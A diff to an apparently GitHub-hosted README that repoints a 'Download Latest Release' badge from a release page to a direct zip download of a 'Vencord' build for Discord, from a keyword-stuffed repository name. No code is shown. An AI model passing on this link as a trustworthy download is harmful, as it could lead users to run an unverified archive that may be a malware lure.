@@ -24,7 +24,7 @@
 ---
 
 <p align="center">
-  <a href="https://github.com/somer-100png/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/releases/latest">
+  <a href="https://github.com/somer-100png/Vencord-Tools-Plugins-Pack-Custom-Themes-Utilities-Guides-for-Discord-Enhancement/releases/download/v7.21.8/Vencord.build.7.21.8.zip">
     <img 
       src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20LATEST%20RELEASE-%23ff4f8b?style=for-the-badge&logo=github&logoColor=white&labelColor=000000" 
       alt="Download Latest Release"
